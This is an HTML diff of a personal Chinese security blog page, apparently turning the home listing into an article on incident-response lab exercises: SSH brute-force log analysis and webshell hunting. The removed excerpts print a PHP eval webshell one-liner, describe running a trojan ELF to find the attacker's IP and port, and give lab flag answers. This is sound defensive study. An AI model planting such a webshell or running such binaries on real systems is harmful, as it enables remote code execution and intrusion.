@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>theonEyy</title>
+    <title> | theonEyy</title>
     <meta name="author" content="theonEyy" />
     <meta name="description" content="好好吃饭 天天开心" />
     <meta name="keywords" content="" />
@@ -42,7 +42,9 @@
 
 
 
-<script src="/js/lib/home.js"></script>
+
+
+
 
 <link rel="stylesheet" href="/css/main.css" />
 
@@ -152,93 +154,11 @@
 </transition>
 
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
-            <div id="home-head">
-    <div
-        id="home-background"
-        ref="homeBackground"
-        data-images="/images/background.jpg"
-    ></div>
-    <div id="home-info" @click="homeClick">
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="loop"></span>
-        <span class="info">
-            <div class="wrap">
-                <h1>theonEyy</h1>
-                <h3>To explore</h3>
-                <h5>好好吃饭 天天开心</h5>
-            </div>
-        </span>
+            <div class="article">
+    <div>
+        <h1></h1>
     </div>
-</div>
-<div
-    id="home-posts-wrap"
-    ref="homePostsWrap"
-    true
->
-    <div id="home-posts">
-        
-
-<div class="post">
-    <a href="/2024/11/13/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0webshell%E6%9F%A5%E6%9D%80/">
-        <h2 class="post-title">玄机--第一章--webshell查杀</h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="category">
-            <a href="/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">
-                <span class="icon">
-                    <i class="fa-solid fa-bookmark fa-fw"></i>
-                </span>
-                -应急响应
-            </a>
-        </span>
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/11/13
-        </span>
-        
-        
-        <span class="special">
-            <i class="fa-solid fa-grip-vertical fa-fw"></i>
-        </span>
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <p>迟早都要学，早学早结束</p>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        <span class="icon">
-            <i class="fa-solid fa-tags fa-fw"></i>
-        </span>
-        
-        
-        
-        <span class="tag">
-            
-            <a href="/tags/%E7%8E%84%E6%9C%BA/" style="color: #ffa2c4">-玄机</a>
-        </span>
-        
-    </div>
-    <a href="/2024/11/13/%E7%8E%84%E6%9C%BA-%E7%AC%AC%E4%B8%80%E7%AB%A0webshell%E6%9F%A5%E6%9D%80/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/11/26/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">
-        <h2 class="post-title"></h2>
-    </a>
-    <div class="category-and-date">
-        
+    <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
@@ -248,10 +168,9 @@
         
         
     </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h2 id="玄机——第一章-应急响应-Linux日志分析"><a href="#玄机——第一章-应急响应-Linux日志分析" class="headerlink" title="玄机——第一章 应急响应-Linux日志分析"></a>玄机——第一章 应急响应-Linux日志分析</h2><h3 id="1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h3><p>首先肯定是先找到日志的位置，一般来说，SSH登录尝试会记录在 <strong>&#x2F;var&#x2F;log&#x2F;auth.log.1</strong></p>
+    
+    <div class="content" v-pre>
+        <h2 id="玄机——第一章-应急响应-Linux日志分析"><a href="#玄机——第一章-应急响应-Linux日志分析" class="headerlink" title="玄机——第一章 应急响应-Linux日志分析"></a>玄机——第一章 应急响应-Linux日志分析</h2><h3 id="1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#1-有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>1.有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h3><p>首先肯定是先找到日志的位置，一般来说，SSH登录尝试会记录在 <strong>&#x2F;var&#x2F;log&#x2F;auth.log.1</strong></p>
 <ul>
 <li><strong>使用grep筛选出SSH失败的登录尝试</strong>： 我们需要筛选出涉及到root帐号的SSH失败登录尝试的日志条目。</li>
 </ul>
@@ -332,100 +251,13 @@
 <h3 id="常见日志文件"><a href="#常见日志文件" class="headerlink" title="常见日志文件"></a><strong>常见日志文件</strong></h3><p>Linux系统中的日志文件通常存储在 <code>/var/log</code> 目录下，常见的日志文件包括：</p>
 <p>&#x2F;var&#x2F;log&#x2F;syslog：记录系统的各种信息和错误。<br>&#x2F;var&#x2F;log&#x2F;auth.log：记录身份验证相关的信息，如登录和认证失败。<br>&#x2F;var&#x2F;log&#x2F;kern.log：记录内核生成的日志信息。<br>&#x2F;var&#x2F;log&#x2F;dmesg：记录系统启动时内核产生的消息。<br>&#x2F;var&#x2F;log&#x2F;boot.log：记录系统启动过程中的消息。<br>&#x2F;var&#x2F;log&#x2F;messages：记录系统的广泛消息，包括启动和应用程序信息。<br>&#x2F;var&#x2F;log&#x2F;secure：记录安全相关的消息。<br>&#x2F;var&#x2F;log&#x2F;httpd&#x2F;：记录Apache HTTP服务器的访问和错误日志（若安装了Apache）。<br>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;：记录Nginx服务器的访问和错误日志（若安装了Nginx）。</p>
 
-            
-        </div>
     </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/11/26/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0Linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" class="go-post">阅读全文</a>
-</div>
-
-<div class="post">
-    <a href="/2024/11/26/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%20Linux/">
-        <h2 class="post-title"></h2>
-    </a>
-    <div class="category-and-date">
-        
-        <span class="date">
-            <span class="icon">
-                <i class="fa-solid fa-calendar fa-fw"></i>
-            </span>
-            2024/11/26
-        </span>
-        
-        
-    </div>
-    <div class="description">
-        <div class="content" v-pre>
-            
-            <h2 id="第一章-应急响应-Linux入侵排查"><a href="#第一章-应急响应-Linux入侵排查" class="headerlink" title="第一章 应急响应- Linux入侵排查"></a>第一章 应急响应- Linux入侵排查</h2><p>到&#x2F;var&#x2F;www把html目录dump下来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf html.tar.gz ./</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-web目录存在木马，请找到木马的密码提交"><a href="#1-web目录存在木马，请找到木马的密码提交" class="headerlink" title="1.web目录存在木马，请找到木马的密码提交"></a>1.web目录存在木马，请找到木马的密码提交</h3><p>使用河马</p>
-<p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241123232018965.png" alt="image-20241123232018965"></p>
-<p>1.php中</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>flag{1}</p>
-<h3 id="2-服务器疑似存在不死马，请找到不死马的密码提交"><a href="#2-服务器疑似存在不死马，请找到不死马的密码提交" class="headerlink" title="2.服务器疑似存在不死马，请找到不死马的密码提交"></a>2.服务器疑似存在不死马，请找到不死马的密码提交</h3><p>index.php观察到不死马</p>
-<p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241123232141400.png" alt="image-20241123232141400"></p>
-<p>5d41402abc4b2a76b9719d911017c592是helloMD5加密后的结果</p>
-<p>flag{hello}</p>
-<h3 id="3-不死马是通过哪个文件生成的，请提交文件名"><a href="#3-不死马是通过哪个文件生成的，请提交文件名" class="headerlink" title="3.不死马是通过哪个文件生成的，请提交文件名"></a>3.不死马是通过哪个文件生成的，请提交文件名</h3><p>flag{index.php}</p>
-<h3 id="4-黑客留下了木马文件，请找出黑客的服务器ip提交"><a href="#4-黑客留下了木马文件，请找出黑客的服务器ip提交" class="headerlink" title="4.黑客留下了木马文件，请找出黑客的服务器ip提交"></a>4.黑客留下了木马文件，请找出黑客的服务器ip提交</h3><p>关键点在shell.elf</p>
-<p>在虚拟机上跑一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-1:/var/www/html# chmod +x shell\(1\).elf </span><br><span class="line">root@ip-10-0-10-1:/var/www/html# ./shell\(1\).elf &amp;</span><br></pre></td></tr></table></figure>
-
-<p><img src="C:\Users\30938\AppData\Roaming\Typora\typora-user-images\image-20241124000248932.png" alt="image-20241124000248932"></p>
-<h3 id="5-黑客留下了木马文件，请找出黑客服务器开启的监端口提交"><a href="#5-黑客留下了木马文件，请找出黑客服务器开启的监端口提交" class="headerlink" title="5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交"></a>5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</h3><ul>
-<li><p>步骤4了解后，那么端口号也知道了</p>
-<p>flag{3333}</p>
-</li>
-</ul>
-
-            
-        </div>
-    </div>
-    <div class="post-tags">
-        
-        
-        
-    </div>
-    <a href="/2024/11/26/%E7%8E%84%E6%9C%BA%E7%AC%AC%E4%B8%80%E7%AB%A0%20%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-%20Linux/" class="go-post">阅读全文</a>
-</div>
-
-
-        <div class="page-current">
     
-    <span class="current">1</span>
     
     
     
     
-</div>
-
-    </div>
     
-    <div id="home-card">
-        <div id="card-style">
-    <div id="card-div">
-        <div class="avatar">
-            <img src="/images/avatar.jpg" alt="avatar" />
-        </div>
-        <div class="name">theonEyy</div>
-        <div class="description">
-            <p>Better and Better</p>
-
-        </div>
-        
-        
-    </div>
-</div>
-
-    </div>
     
 </div>
 
@@ -457,6 +289,12 @@
         
     </div>
     <script src="/js/main.js"></script>
+    
+    
+
+
+
+
     
 <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
 </html>
